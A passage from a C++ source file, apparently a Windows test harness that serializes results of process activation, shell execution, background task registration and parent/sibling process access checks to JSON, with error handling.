                << context.activation_hresult
                << ",\"activation_hresult_hex\":\""
                << HexHresult(context.activation_hresult)
                << "\",\"activation_pid\":" << context.activation_pid
                << ",\"shell_execute_succeeded\":"
                << (context.shell_execute_succeeded ? "true" : "false")
                << ",\"shell_execute_error\":"
                << context.shell_execute_error
                << ",\"shell_execute_pid\":" << context.shell_execute_pid
                << ",\"app_exec_alias_succeeded\":"
                << (context.app_exec_alias_succeeded ? "true" : "false")
                << ",\"app_exec_alias_error\":"
                << context.app_exec_alias_error
                << ",\"app_exec_alias_pid\":"
                << context.app_exec_alias_pid
                << ",\"shell_dispatch_hresult\":"
                << context.shell_dispatch_hresult
                << ",\"shell_dispatch_hresult_hex\":\""
                << HexHresult(context.shell_dispatch_hresult)
                << "\",\"notification_activation_hresult\":"
                << context.notification_activation_hresult
                << ",\"notification_activation_hresult_hex\":\""
                << HexHresult(context.notification_activation_hresult)
                << "\",\"parent_pid\":" << context.parent_pid
                << ",\"parent_injection_access\":"
                << (context.parent_injection_access ? "true" : "false")
                << ",\"parent_injection_open_error\":"
                << context.parent_injection_open_error
                << ",\"sibling_injection_pid\":"
                << context.sibling_injection_pid
                << ",\"sibling_injection_access\":"
                << (context.sibling_injection_access ? "true" : "false")
                << ",\"sibling_injection_open_error\":"
                << context.sibling_injection_open_error
                << ",\"background_access_hresult\":"
                << context.background_access_hresult
                << ",\"background_access_hresult_hex\":\""
                << HexHresult(context.background_access_hresult)
                << "\",\"background_access_status\":"
                << context.background_access_status
                << ",\"background_task_name\":\""
                << JsonEscape(context.background_task_name)
                << "\",\"background_registered\":"
                << (context.background_registered ? "true" : "false")
                << ",\"background_register_hresult\":"
                << context.background_register_hresult
                << ",\"background_register_hresult_hex\":\""
                << HexHresult(context.background_register_hresult) << "\"}\n";
      return 0;
    }

    throw std::runtime_error("unknown mode");
  } catch (const std::exception& error) {
    std::cerr << "{\"harness_error\":\"";
    const std::wstring wide_error(error.what(),
                                  error.what() + strlen(error.what()));
    std::cerr << JsonEscape(wide_error) << "\"}\n";
    return 2;
  }
}
